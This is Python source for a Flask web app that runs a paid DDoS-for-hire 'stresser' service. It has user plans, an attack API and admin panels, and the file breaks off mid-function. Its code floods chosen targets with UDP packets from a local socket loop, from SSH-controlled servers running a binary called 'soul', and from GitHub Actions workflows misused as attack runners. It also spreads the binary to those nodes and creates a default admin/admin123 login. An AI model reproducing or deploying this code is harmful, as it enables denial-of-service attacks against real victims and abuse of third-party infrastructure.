#!/usr/bin/env python3
import os
import socket
import random
import time
import threading
import requests
import secrets
import paramiko
from github import Github, GithubException
from datetime import datetime, timedelta
from functools import wraps
from flask import Flask, render_template_string, request, redirect, url_for, flash, session, jsonify
from pymongo import MongoClient
from bson.objectid import ObjectId
from werkzeug.security import generate_password_hash, check_password_hash
from flask_sqlalchemy import SQLAlchemy

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", secrets.token_urlsafe(32))

# ---------- Database: try MongoDB, fallback to SQLite ----------
USE_MONGO = False
MONGO_URL = os.environ.get("MONGO_URL")
if MONGO_URL:
    try:
        client = MongoClient(MONGO_URL, serverSelectionTimeoutMS=5000)
        client.admin.command('ping')
        db = client['stresser_db']
        USE_MONGO = True
        print("✅ MongoDB connected")
    except Exception as e:
        print(f"❌ MongoDB error: {e} – falling back to SQLite")
else:
    print("⚠️ MONGO_URL not set – using SQLite")

if USE_MONGO:
    users_col = db['users']
    api_keys_col = db['api_keys']
    attack_logs_col = db['attack_logs']
    attack_nodes_col = db['attack_nodes']
    admin_users_col = db['admin_users']
else:
    app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///stresser.db'
    app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
    db_sql = SQLAlchemy(app)

    # SQLite Models
    class User(db_sql.Model):
        id = db_sql.Column(db_sql.Integer, primary_key=True)
        token = db_sql.Column(db_sql.String(128), unique=True, nullable=False)
        plan = db_sql.Column(db_sql.String(50), default="Free Plan")
        max_concurrent = db_sql.Column(db_sql.Integer, default=1)
        max_duration = db_sql.Column(db_sql.Integer, default=60)
        slots_used = db_sql.Column(db_sql.Integer, default=0)
        total_attacks = db_sql.Column(db_sql.Integer, default=0)
        created_at = db_sql.Column(db_sql.DateTime, default=datetime.utcnow)

    class ApiKey(db_sql.Model):
        id = db_sql.Column(db_sql.Integer, primary_key=True)
        user_id = db_sql.Column(db_sql.Integer, db_sql.ForeignKey('user.id'))
        key = db_sql.Column(db_sql.String(64), unique=True, nullable=False)
        name = db_sql.Column(db_sql.String(100), default="Default")
        whitelist_ips = db_sql.Column(db_sql.Text, default="")
        expires_at = db_sql.Column(db_sql.DateTime, nullable=True)
        created_at = db_sql.Column(db_sql.DateTime, default=datetime.utcnow)

    class AttackLog(db_sql.Model):
        id = db_sql.Column(db_sql.Integer, primary_key=True)
        user_id = db_sql.Column(db_sql.Integer, db_sql.ForeignKey('user.id'))
        target = db_sql.Column(db_sql.String(100))
        port = db_sql.Column(db_sql.Integer)
        duration = db_sql.Column(db_sql.Integer)
        method = db_sql.Column(db_sql.String(50), default="UDP")
        concurrent = db_sql.Column(db_sql.Integer, default=1)
        status = db_sql.Column(db_sql.String(20), default='running')
        timestamp = db_sql.Column(db_sql.DateTime, default=datetime.utcnow)

    class AttackNode(db_sql.Model):
        id = db_sql.Column(db_sql.Integer, primary_key=True)
        name = db_sql.Column(db_sql.String(100), nullable=False)
        node_type = db_sql.Column(db_sql.String(20), nullable=False)
        enabled = db_sql.Column(db_sql.Boolean, default=True)
        github_token = db_sql.Column(db_sql.String(200), nullable=True)
        github_repo = db_sql.Column(db_sql.String(200), nullable=True)
        vps_host = db_sql.Column(db_sql.String(100), nullable=True)
        vps_port = db_sql.Column(db_sql.Integer, default=22)
        vps_username = db_sql.Column(db_sql.String(100), nullable=True)
        vps_password = db_sql.Column(db_sql.String(200), nullable=True)
        vps_key_path = db_sql.Column(db_sql.String(200), nullable=True)
        last_status = db_sql.Column(db_sql.String(50), default="unknown")
        binary_present = db_sql.Column(db_sql.Boolean, default=False)
        created_at = db_sql.Column(db_sql.DateTime, default=datetime.utcnow)

    class AdminUser(db_sql.Model):
        id = db_sql.Column(db_sql.Integer, primary_key=True)
        username = db_sql.Column(db_sql.String(80), unique=True, nullable=False)
        password_hash = db_sql.Column(db_sql.String(200), nullable=False)
        created_at = db_sql.Column(db_sql.DateTime, default=datetime.utcnow)

    with app.app_context():
        db_sql.create_all()
        if not AdminUser.query.first():
            admin = AdminUser(username='admin', password_hash=generate_password_hash('admin123'))
            db_sql.session.add(admin)
            db_sql.session.commit()
            print("SQLite: default admin created (admin/admin123)")
        if not User.query.first():
            default_token = secrets.token_urlsafe(32)
            user = User(token=default_token, plan="Free Plan", max_concurrent=1, max_duration=60)
            db_sql.session.add(user)
            db_sql.session.commit()
            print(f"SQLite: default user token: {default_token}")

# ---------- Helper Functions ----------
def generate_captcha():
    a = random.randint(1, 10)
    b = random.randint(1, 10)
    op = random.choice(['+', '-'])
    if op == '+':
        answer = a + b
        question = f"{a} + {b} = ?"
    else:
        if a < b:
            a, b = b, a
        answer = a - b
        question = f"{a} - {b} = ?"
    return question, answer

def generate_token():
    return secrets.token_urlsafe(32)

def get_user_by_token(token):
    if USE_MONGO:
        return users_col.find_one({"token": token})
    else:
        return User.query.filter_by(token=token).first()

def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'admin_logged_in' not in session or not session['admin_logged_in']:
            flash('Please login as admin first', 'danger')
            return redirect(url_for('admin_login'))
        return f(*args, **kwargs)
    return decorated_function

# ---------- Proxy Management (for HTTP fallback) ----------
PROXY_LIST = []
LAST_PROXY_FETCH = 0

def fetch_proxies():
    global PROXY_LIST, LAST_PROXY_FETCH
    urls = [
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
    ]
    new_proxies = []
    for url in urls:
        try:
            resp = requests.get(url, timeout=10)
            lines = resp.text.splitlines()
            proxies = [p.strip() for p in lines if ":" in p and p.strip()]
            if proxies:
                new_proxies.extend(proxies)
        except:
            continue
    PROXY_LIST = list(set(new_proxies))
    LAST_PROXY_FETCH = time.time()
    print(f"[+] Loaded {len(PROXY_LIST)} proxies")

def get_random_proxy():
    if not PROXY_LIST:
        fetch_proxies()
    if PROXY_LIST:
        return random.choice(PROXY_LIST)
    return None

fetch_proxies()

# ---------- GitHub Helpers ----------
def create_github_repository(token, repo_name="InfernoCore"):
    try:
        g = Github(token)
        user = g.get_user()
        try:
            repo = user.get_repo(repo_name)
            return repo, False
        except GithubException:
            repo = user.create_repo(
                repo_name,
                description="Inferno Stresser Repository",
                private=False,
                auto_init=False
            )
            return repo, True
    except Exception as e:
        raise Exception(f"Failed to create repository: {e}")

def test_github_node(node):
    if USE_MONGO:
        token = node['github_token']
        repo_name = node['github_repo']
    else:
        token = node.github_token
        repo_name = node.github_repo
    try:
        g = Github(token)
        user = g.get_user()
        repo = g.get_repo(repo_name)
        if USE_MONGO:
            attack_nodes_col.update_one({"_id": node['_id']}, {"$set": {"last_status": "online"}})
            try:
                repo.get_contents("soul")
                attack_nodes_col.update_one({"_id": node['_id']}, {"$set": {"binary_present": True}})
            except:
                attack_nodes_col.update_one({"_id": node['_id']}, {"$set": {"binary_present": False}})
        else:
            node.last_status = "online"
            try:
                repo.get_contents("soul")
                node.binary_present = True
            except:
                node.binary_present = False
            db_sql.session.commit()
        return True, "GitHub OK"
    except Exception as e:
        if USE_MONGO:
            attack_nodes_col.update_one({"_id": node['_id']}, {"$set": {"last_status": "offline", "binary_present": False}})
        else:
            node.last_status = "offline"
            node.binary_present = False
            db_sql.session.commit()
        return False, str(e)

def test_vps_node(node):
    if USE_MONGO:
        host = node['vps_host']
        port = node['vps_port']
        username = node['vps_username']
        password = node.get('vps_password')
        key_path = node.get('vps_key_path')
    else:
        host = node.vps_host
        port = node.vps_port
        username = node.vps_username
        password = node.vps_password
        key_path = node.vps_key_path
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        if key_path and os.path.exists(key_path):
            ssh.connect(host, port=port, username=username, key_filename=key_path, timeout=5)
        elif password:
            ssh.connect(host, port=port, username=username, password=password, timeout=5)
        else:
            return False, "No authentication method"
        stdin, stdout, stderr = ssh.exec_command("test -f /root/soul && echo 'exists'")
        output = stdout.read().decode().strip()
        ssh.close()
        binary_present = (output == 'exists')
        if USE_MONGO:
            attack_nodes_col.update_one({"_id": node['_id']}, {"$set": {"last_status": "online", "binary_present": binary_present}})
        else:
            node.last_status = "online"
            node.binary_present = binary_present
            db_sql.session.commit()
        return True, "SSH OK" + (" (binary found)" if binary_present else " (binary missing)")
    except Exception as e:
        if USE_MONGO:
            attack_nodes_col.update_one({"_id": node['_id']}, {"$set": {"last_status": "offline", "binary_present": False}})
        else:
            node.last_status = "offline"
            node.binary_present = False
            db_sql.session.commit()
        return False, str(e)

# ---------- Binary Distribution ----------
def distribute_binary_to_github(node, binary_data):
    if USE_MONGO:
        token = node['github_token']
        repo_name = node['github_repo']
    else:
        token = node.github_token
        repo_name = node.github_repo
    try:
        g = Github(token)
        repo = g.get_repo(repo_name)
        try:
            contents = repo.get_contents("soul")
            repo.update_file("soul", "Update binary", binary_data, contents.sha, branch="main")
        except:
            repo.create_file("soul", "Add binary", binary_data, branch="main")
        if USE_MONGO:
            attack_nodes_col.update_one({"_id": node['_id']}, {"$set": {"binary_present": True}})
        else:
            node.binary_present = True
            db_sql.session.commit()
        return True
    except Exception as e:
        print(e)
        return False

def distribute_binary_to_vps(node, binary_data):
    if USE_MONGO:
        host = node['vps_host']
        port = node['vps_port']
        username = node['vps_username']
        password = node.get('vps_password')
        key_path = node.get('vps_key_path')
    else:
        host = node.vps_host
        port = node.vps_port
        username = node.vps_username
        password = node.vps_password
        key_path = node.vps_key_path
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        if key_path and os.path.exists(key_path):
            ssh.connect(host, port=port, username=username, key_filename=key_path, timeout=10)
        elif password:
            ssh.connect(host, port=port, username=username, password=password, timeout=10)
        else:
            return False
        sftp = ssh.open_sftp()
        remote_path = "/root/soul"
        try:
            sftp.stat("/root")
        except:
            sftp.mkdir("/root")
        with sftp.open(remote_path, 'wb') as f:
            f.write(binary_data)
        sftp.chmod(remote_path, 0o755)
        sftp.close()
        ssh.close()
        if USE_MONGO:
            attack_nodes_col.update_one({"_id": node['_id']}, {"$set": {"binary_present": True}})
        else:
            node.binary_present = True
            db_sql.session.commit()
        return True
    except Exception as e:
        print(e)
        return False

# ---------- Attack Triggers ----------
def trigger_github_node(node, target, port, duration, method):
    binary_method = "udp"
    matrix_size = 10
    matrix_list = ','.join(str(i) for i in range(1, matrix_size+1))
    yml_content = f"""name: Inferno Attack
on: [push]

jobs:
  stage-0-init:
    runs-on: ubuntu-22.04
    strategy:
      matrix:
        n: [{matrix_list}]
    steps:
      - uses: actions/checkout@v3
      - run: chmod +x soul
      - run: ./soul {target} {port} 10 {binary_method}

  stage-1-main:
    needs: stage-0-init
    runs-on: ubuntu-22.04
    strategy:
      matrix:
        n: [{matrix_list}]
    steps:
      - uses: actions/checkout@v3
      - run: chmod +x soul
      - run: ./soul {target} {port} {duration} {binary_method}

  stage-2-calc:
    runs-on: ubuntu-latest
    outputs:
      matrix_list: ${{{{ steps.calc.outputs.matrix_list }}}}
    steps:
      - id: calc
        run: |
          NUM_JOBS=$(({duration} / 10))
          if [ $NUM_JOBS -lt 1 ]; then NUM_JOBS=1; fi
          ARRAY=$(seq 1 $NUM_JOBS | jq -R . | jq -s -c .)
          echo "matrix_list=$ARRAY" >> $GITHUB_OUTPUT

  stage-2-sequential:
    needs: [stage-0-init, stage-2-calc]
    runs-on: ubuntu-22.04
    strategy:
      max-parallel: 1
      matrix:
        iteration: ${{{{ fromJson(needs.stage-2-calc.outputs.matrix_list) }}}}
    steps:
      - uses: actions/checkout@v3
      - run: chmod +x soul
      - run: ./soul {target} {port} 10 {binary_method}

  stage-3-cleanup:
    needs: [stage-1-main, stage-2-sequential]
    runs-on: ubuntu-22.04
    if: always()
    steps:
      - run: echo "Attack completed on $(date)"
"""
    if USE_MONGO:
        token = node['github_token']
        repo_name = node['github_repo']
    else:
        token = node.github_token
        repo_name = node.github_repo
    try:
        g = Github(token)
        repo = g.get_repo(repo_name)
        try:
            contents = repo.get_contents(".github/workflows/main.yml")
            repo.update_file(".github/workflows/main.yml", f"Attack {target}:{port}", yml_content, contents.sha)
        except:
            repo.create_file(".github/workflows/main.yml", f"Attack {target}:{port}", yml_content)
        return True
    except Exception as e:
        print(e)
        return False

def trigger_vps_node(node, target, port, duration, method):
    binary_method = "udp"
    if USE_MONGO:
        host = node['vps_host']
        port_v = node['vps_port']
        username = node['vps_username']
        password = node.get('vps_password')
        key_path = node.get('vps_key_path')
    else:
        host = node.vps_host
        port_v = node.vps_port
        username = node.vps_username
        password = node.vps_password
        key_path = node.vps_key_path
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        if key_path and os.path.exists(key_path):
            ssh.connect(host, port=port_v, username=username, key_filename=key_path, timeout=10)
        elif password:
            ssh.connect(host, port=port_v, username=username, password=password, timeout=10)
        else:
            return False
        cmd = f"cd /root && ./soul {target} {port} {duration} {binary_method} > /dev/null 2>&1 &"
        ssh.exec_command(cmd)
        ssh.close()
        return True
    except Exception as e:
        print(e)
        return False

def run_local_python(target, port, duration, method):
    end_time = time.time() + duration
    packets = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**20)
    payload = random.randbytes(1024)
    while time.time() < end_time:
        sock.sendto(payload, (target, port))
        packets += 1
    sock.close()
    return packets

def run_attack_on_nodes(user_id, target, port, duration, method, source='web'):
    if USE_MONGO:
        nodes = list(attack_nodes_col.find({"enabled": True}))
    else:
        nodes = AttackNode.query.filter_by(enabled=True).all()
    if not nodes:
        packets = run_local_python(target, port, duration, method)
        if USE_MONGO:
            attack_logs_col.insert_one({
                "user_id": user_id,
                "target": target,
                "port": port,
                "duration": duration,
                "method": method,
                "concurrent": 1,
                "status": "completed",
                "timestamp": datetime.utcnow()
            })
            if user_id:
                users_col.update_one({"_id": user_id}, {"$inc": {"total_attacks": 1, "slots_used": -1}})
        else:
            log = AttackLog(user_id=user_id, target=target, port=port, duration=duration, method=method, concurrent=1, status='completed')
            db_sql.session.add(log)
            if user_id:
                user = User.query.get(user_id)
                if user:
                    user.total_attacks += 1
                    user.slots_used = max(0, user.slots_used - 1)
            db_sql.session.commit()
        return

    if USE_MONGO:
        log_id = attack_logs_col.insert_one({
            "user_id": user_id,
            "target": target,
            "port": port,
            "duration": duration,
            "method": method,
            "concurrent": len(nodes),
            "status": "running",
            "timestamp": datetime.utcnow()
        }).inserted_id
        if user_id:
            users_col.update_one({"_id": user_id}, {"$inc": {"total_attacks": 1}})
    else:
        log = AttackLog(user_id=user_id, target=target, port=port, duration=duration, method=method, concurrent=len(nodes), status='running')
        db_sql.session.add(log)
        db_sql.session.commit()
        log_id = log.id
        if user_id:
            user = User.query.get(user_id)
            if user:
                user.total_attacks += 1
                db_sql.session.commit()

    threads = []
    def worker(node):
        if node.node_type == 'github':
            trigger_github_node(node, target, port, duration, method)
        else:
            trigger_vps_node(node, target, port, duration, method)
    for node in nodes:
        t = threading.Thread(target=worker, args=(node,))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

    if USE_MONGO:
        attack_logs_col.update_one({"_id": log_id}, {"$set": {"status": "completed"}})
    else:
        log = AttackLog.query.get(log_id)
        if log:
            log.status = 'completed'
            db_sql.session.commit()

# ---------- Flask Routes ----------
@app.route('/')
def index():
    if 'user_token' in session:
        return redirect(url_for('dashboard'))
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        token = request.form.get('token')
        captcha_answer = request.form.get('captcha')
        expected_answer = session.get('captcha_answer')
        if not captcha_answer or not expected_answer or str(captcha_answer) != str(expected_answer):
            flash('Invalid captcha', 'danger')
            q, a = generate_captcha()
            session['captcha_question'] = q
            session['captcha_answer'] = a
            return render_template_string(LOGIN_HTML, captcha_question=q)
        user = get_user_by_token(token)
        if user:
            session['user_token'] = token
            session['user_id'] = str(user['_id']) if USE_MONGO else user.id
            flash('Logged in', 'success')
            return redirect(url_for('dashboard'))
        flash('Invalid token', 'danger')
    q, a = generate_captcha()
    session['captcha_question'] = q
    session['captcha_answer'] = a
    return render_template_string(LOGIN_HTML, captcha_question=q)

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        captcha_answer = request.form.get('captcha')
        expected_answer = session.get('captcha_answer')
        if not captcha_answer or not expected_answer or str(captcha_answer) != str(expected_answer):
            flash('Invalid captcha', 'danger')
            q, a = generate_captcha()
            session['captcha_question'] = q
            session['captcha_answer'] = a
            return render_template_string(REGISTER_HTML, captcha_question=q)
        token = generate_token()
        if USE_MONGO:
            user = {
                "token": token,
                "plan": "Free Plan",
                "max_concurrent": 1,
                "max_duration": 60,
                "slots_used": 0,
                "total_attacks": 0,
                "created_at": datetime.utcnow()
            }
            users_col.insert_one(user)
        else:
            user = User(token=token, plan="Free Plan", max_concurrent=1, max_duration=60)
            db_sql.session.add(user)
            db_sql.session.commit()
        flash(f'Your access token: {token}', 'success')
        return redirect(url_for('login'))
    q, a = generate_captcha()
    session['captcha_question'] = q
    session['captcha_answer'] = a
    return render_template_string(REGISTER_HTML, captcha_question=q)

@app.route('/dashboard')
def dashboard():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    if USE_MONGO:
        user = users_col.find_one({"_id": ObjectId(session['user_id'])})
        attacks = list(attack_logs_col.find({"user_id": session['user_id']}).sort("timestamp", -1).limit(10))
        slots_used = user.get('slots_used', 0)
        max_slots = user.get('max_concurrent', 1)
    else:
        user = User.query.get(session['user_id'])
        attacks = AttackLog.query.filter_by(user_id=user.id).order_by(AttackLog.timestamp.desc()).limit(10).all()
        slots_used = user.slots_used
        max_slots = user.max_concurrent
    return render_template_string(DASHBOARD_HTML, user=user, attacks=attacks, slots_used=slots_used, max_slots=max_slots)

@app.route('/attack', methods=['GET', 'POST'])
def attack_page():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    if USE_MONGO:
        user = users_col.find_one({"_id": ObjectId(session['user_id'])})
    else:
        user = User.query.get(session['user_id'])
    if request.method == 'POST':
        target = request.form.get('target')
        port = int(request.form.get('port'))
        duration = int(request.form.get('duration'))
        method = request.form.get('method', 'UDP')
        concurrent = int(request.form.get('concurrent', 1))
        if duration > user['max_duration']:
            flash(f'Duration exceeds limit ({user["max_duration"]}s)', 'danger')
            return redirect(url_for('attack_page'))
        if concurrent > user['max_concurrent']:
            flash(f'Concurrent exceeds limit ({user["max_concurrent"]})', 'danger')
            return redirect(url_for('attack_page'))
        if user.get('slots_used', 0) + concurrent > user['max_concurrent']:
            flash('No free slots', 'danger')
            return redirect(url_for('attack_page'))
        if USE_MONGO:
            users_col.update_one({"_id": ObjectId(session['user_id'])}, {"$inc": {"slots_used": concurrent}})
            thread = threading.Thread(target=run_attack_on_nodes, args=(ObjectId(session['user_id']), target, port, duration, method, 'web'))
        else:
            user.slots_used += concurrent
            db_sql.session.commit()
            thread = threading.Thread(target=run_attack_on_nodes, args=(user.id, target, port, duration, method, 'web'))
        thread.daemon = True
        thread.start()
        flash(f'Attack launched on {target}:{port} ({method})', 'success')
        return redirect(url_for('attack_page'))
    return render_template_string(ATTACK_HTML, user=user)

@app.route('/products')
def products_page():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    if USE_MONGO:
        user = users_col.find_one({"_id": ObjectId(session['user_id'])})
    else:
        user = User.query.get(session['user_id'])
    plans = [
        {'name': 'Free Plan', 'price': 'Free', 'concurrent': 1, 'duration': 60, 'methods': 'UDP Only', 'slots': 1},
        {'name': 'Pro Plan', 'price': '$49/month', 'concurrent': 5, 'duration': 300, 'methods': 'UDP Only', 'slots': 5},
        {'name': 'Enterprise Plan', 'price': '$199/month', 'concurrent': 25, 'duration': 1200, 'methods': 'UDP Only', 'slots': 25},
        {'name': 'Ultimate Plan', 'price': '$499/month', 'concurrent': 100, 'duration': 3600, 'methods': 'UDP Only', 'slots': 100}
    ]
    return render_template_string(PRODUCTS_HTML, user=user, plans=plans)

@app.route('/api/attack', methods=['POST'])
def api_attack():
    data = request.get_json()
    if not data:
        return jsonify({'error': 'Invalid JSON'}), 400
    api_key = data.get('api_key')
    target = data.get('target')
    port = data.get('port')
    duration = data.get('duration')
    method = data.get('method', 'UDP')
    concurrent = data.get('concurrent', 1)
    if not api_key or not target or not port or not duration:
        return jsonify({'error': 'Missing parameters'}), 400
    if USE_MONGO:
        key_obj = api_keys_col.find_one({"key": api_key})
    else:
        key_obj = ApiKey.query.filter_by(key=api_key).first()
    if not key_obj:
        return jsonify({'error': 'Invalid API key'}), 401
    if key_obj.get('expires_at') and datetime.utcnow() > key_obj['expires_at']:
        return jsonify({'error': 'API key expired'}), 403
    if key_obj.get('whitelist_ips'):
        allowed_ips = [ip.strip() for ip in key_obj['whitelist_ips'].split(',')]
        if request.remote_addr not in allowed_ips:
            return jsonify({'error': 'IP not whitelisted'}), 403
    if USE_MONGO:
        user = users_col.find_one({"_id": key_obj['user_id']})
    else:
        user = User.query.get(key_obj.user_id)
    if not user:
        return jsonify({'error': 'User not found'}), 404
    if duration > user['max_duration']:
        return jsonify({'error': f'Duration exceeds {user["max_duration"]}s'}), 400
    if concurrent > user['max_concurrent']:
        return jsonify({'error': f'Concurrent exceeds {user["max_concurrent"]}'}), 400
    if user.get('slots_used', 0) + concurrent > user['max_concurrent']:
        return jsonify({'error': 'No free slots'}), 429
    if USE_MONGO:
        users_col.update_one({"_id": user['_id']}, {"$inc": {"slots_used": concurrent}})
        thread = threading.Thread(target=run_attack_on_nodes, args=(user['_id'], target, port, duration, method, 'api'))
    else:
        user.slots_used += concurrent
        db_sql.session.commit()
        thread = threading.Thread(target=run_attack_on_nodes, args=(user.id, target, port, duration, method, 'api'))
    thread.daemon = True
    thread.start()
    return jsonify({'status': 'started', 'message': 'Attack started'}), 200

# ---------- Admin Routes ----------
@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if USE_MONGO:
            admin = admin_users_col.find_one({"username": username})
            if admin and check_password_hash(admin['password_hash'], password):
                session['admin_logged_in'] = True
                session['admin_username'] = username
                flash('Admin logged in', 'success')
                return redirect(url_for('admin_dashboard'))
        else:
            admin = AdminUser.query.filter_by(username=username).first()
            if admin and check_password_hash(admin.password_hash, password):
                session['admin_logged_in'] = True
                session['admin_username'] = username
                flash('Admin logged in', 'success')
                return redirect(url_for('admin_dashboard'))
        flash('Invalid admin credentials', 'danger')
    return render_template_string(ADMIN_LOGIN_HTML)

@app.route('/admin/dashboard')
@admin_required
def admin_dashboard():
    if USE_MONGO:
        total_users = users_col.count_documents({})
        total_attacks = attack_logs_col.count_documents({})
        total_nodes = attack_nodes_col.count_documents({})
        active_nodes = attack_nodes_col.count_documents({"enabled": True})
        recent_attacks = list(attack_logs_col.find().sort("timestamp", -1).limit(10))
        users = list(users_col.find().sort("created_at", -1).limit(20))
    else:
        total_users = User.query.count()
        total_attacks = AttackLog.query.count()
        total_nodes = AttackNode.query.count()
        active_nodes = AttackNode.query.filter_by(enabled=True).count()
        recent_attacks = AttackLog.query.order_by(AttackLog.timestamp.desc()).limit(10).all()
        users = User.query.order_by(User.created_at.desc()).limit(20).all()
    return render_template_string(ADMIN_DASHBOARD_HTML,
                                  total_users=total_users,
                                  total_attacks=total_attacks,
                                  total_nodes=total_nodes,
                                  active_nodes=active_nodes,
                                  recent_attacks=recent_attacks,
                                  users=users)

@app.route('/admin/attack', methods=['GET', 'POST'])
@admin_required
def admin_attack():
    if request.method == 'POST':
        target = request.form.get('target')
        port = int(request.form.get('port'))
        duration = int(request.form.get('duration'))
        method = request.form.get('method', 'UDP')
        concurrent = int(request.form.get('concurrent', 1))
        thread = threading.Thread(target=run_attack_on_nodes, args=(None, target, port, duration, method, 'admin'))
        thread.daemon = True
        thread.start()
        flash(f'Admin attack launched on {target}:{port} ({method})', 'success')
        return redirect(url_for('admin_attack'))
    return render_template_string(ADMIN_ATTACK_HTML)

@app.route('/admin/users')
@admin_required
def admin_users():
    if USE_MONGO:
        users = list(users_col.find().sort("created_at", -1))
    else:
        users = User.query.order_by(User.created_at.desc()).all()
    return render_template_string(ADMIN_USERS_HTML, users=users)

@app.route('/admin/users/<user_id>/edit', methods=['POST'])
@admin_required
def admin_edit_user(user_id):
    action = request.form.get('action')
    if USE_MONGO:
        user = users_col.find_one({"_id": ObjectId(user_id)})
        if not user:
            flash('User not found', 'danger')
            return redirect(url_for('admin_users'))
        if action == 'set_limit':
            new_limit = int(request.form.get('max_concurrent', 1))
            users_col.update_one({"_id": ObjectId(user_id)}, {"$set": {"max_concurrent": new_limit}})
            flash(f'User limit set to {new_limit}', 'success')
        elif action == 'reset_token':
            new_token = generate_token()
            users_col.update_one({"_id": ObjectId(user_id)}, {"$set": {"token": new_token}})
            flash(f'Token reset: {new_token}', 'success')
        elif action == 'delete':
            users_col.delete_one({"_id": ObjectId(user_id)})
            flash('User deleted', 'success')
    else:
        user = User.query.get(user_id)
        if not user:
            flash('User not found', 'danger')
            return redirect(url_for('admin_users'))
        if action == 'set_limit':
            new_limit = int(request.form.get('max_concurrent', 1))
            user.max_concurrent = new_limit
            db_sql.session.commit()
            flash(f'User limit set to {new_limit}', 'success')
        elif action == 'reset_token':
            new_token = generate_token()
            user.token = new_token
            db_sql.session.commit()
            flash(f'Token reset: {new_token}', 'success')
        elif action == 'delete':
            db_sql.session.delete(user)
            db_sql.session.commit()
            flash('User deleted', 'success')
    return redirect(url_for('admin_users'))

@app.route('/admin/attacks')
@admin_required
def admin_attacks():
    if USE_MONGO:
        attacks = list(attack_logs_col.find().sort("timestamp", -1).limit(100))
    else:
        attacks = AttackLog.query.order_by(AttackLog.timestamp.desc()).limit(100).all()
    return render_template_string(ADMIN_ATTACKS_HTML, attacks=attacks)

@app.route('/admin/api_keys')
@admin_required
def admin_api_keys():
    if USE_MONGO:
        keys = list(api_keys_col.find())
        users = {str(u['_id']): u['token'][:16] for u in users_col.find()}
    else:
        keys = ApiKey.query.all()
        users = {u.id: u.token[:16] for u in User.query.all()}
    return render_template_string(ADMIN_API_KEYS_HTML, keys=keys, users=users)

@app.route('/admin/api_keys/create', methods=['POST'])
@admin_required
def admin_create_api_key():
    user_id = request.form.get('user_id')
    name = request.form.get('name', 'API Key')
    whitelist_ips = request.form.get('whitelist_ips', '')
    expires_days = request.form.get('expires_days')
    if USE_MONGO:
        user = users_col.find_one({"_id": ObjectId(user_id)})
        if not user:
            flash('User not found', 'danger')
            return redirect(url_for('admin_api_keys'))
        new_key = secrets.token_urlsafe(32)
        expires_at = None
        if expires_days and expires_days.isdigit():
            expires_at = datetime.utcnow() + timedelta(days=int(expires_days))
        api_key = {
            "user_id": ObjectId(user_id),
            "key": new_key,
            "name": name,
            "whitelist_ips": whitelist_ips,
            "expires_at": expires_at,
            "created_at": datetime.utcnow()
        }
        api_keys_col.insert_one(api_key)
        flash(f'API key created: {new_key}', 'success')
    else:
        user = User.query.get(user_id)
        if not user:
            flash('User not found', 'danger')
            return redirect(url_for('admin_api_keys'))
        new_key = secrets.token_urlsafe(32)
        expires_at = None
        if expires_days and expires_days.isdigit():
            expires_at = datetime.utcnow() + timedelta(days=int(expires_days))
        api_key = ApiKey(user_id=user.id, key=new_key, name=name, whitelist_ips=whitelist_ips, expires_at=expires_at)
        db_sql.session.add(api_key)
        db_sql.session.commit()
        flash(f'API key created: {new_key}', 'success')
    return redirect(url_for('admin_api_keys'))

@app.route('/admin/api_keys/<key_id>/delete', methods=['POST'])
@admin_required
def admin_delete_api_key(key_id):
    if USE_MONGO:
        api_keys_col.delete_one({"_id": ObjectId(key_id)})
    else:
        key = ApiKey.query.get(key_id)
        if key:
            db_sql.session.delete(key)
            db_sql.session.commit()
    flash('API key deleted', 'success')
    return redirect(url_for('admin_api_keys'))

@app.route('/admin/nodes')
@admin_required
def admin_nodes():
    if USE_MONGO:
        nodes = list(attack_nodes_col.find())
    else:
        nodes = AttackNode.query.all()
    return render_template_string(ADMIN_NODES_HTML, nodes=nodes)

@app.route('/admin/nodes/add_github', methods=['POST'])
@admin_required
def admin_add_github_node():
    name = request.form.get('name')
    token = request.form.get('github_token')
    repo_name = request.form.get('github_repo', 'InfernoCore')
    enabled = request.form.get('enabled') == 'on'
    if not name or not token:
        flash('Name and token required', 'danger')
        return redirect(url_for('admin_nodes'))
    try:
        repo, created = create_github_repository(token, repo_name)
        if USE_MONGO:
            node = {
                "name": name,
                "node_type": "github",
                "enabled": enabled,
                "github_token": token,
                "github_repo": f"{repo.owner.login}/{repo_name}",
                "last_status": "unknown",
                "binary_present": False,
                "created_at": datetime.utcnow()
            }
            attack_nodes_col.insert_one(node)
        else:
            node = AttackNode(name=name, node_type='github', enabled=enabled, github_token=token, github_repo=f"{repo.owner.login}/{repo_name}")
            db_sql.session.add(node)
            db_sql.session.commit()
        flash(f'GitHub node added! Repository {"created" if created else "already exists"}', 'success')
    except Exception as e:
        flash(f'Error: {str(e)}', 'danger')
    return redirect(url_for('admin_nodes'))

@app.route('/admin/nodes/add_vps', methods=['POST'])
@admin_required
def admin_add_vps_node():
    name = request.form.get('name')
    host = request.form.get('vps_host')
    port = int(request.form.get('vps_port', 22))
    username = request.form.get('vps_username')
    password = request.form.get('vps_password')
    enabled = request.form.get('enabled') == 'on'
    if not name or not host or not username:
        flash('Name, host and username required', 'danger')
        return redirect(url_for('admin_nodes'))
    key_path = None
    if 'vps_key_file' in request.files:
        file = request.files['vps_key_file']
        if file and file.filename:
            key_dir = os.path.join(app.root_path, 'keys')
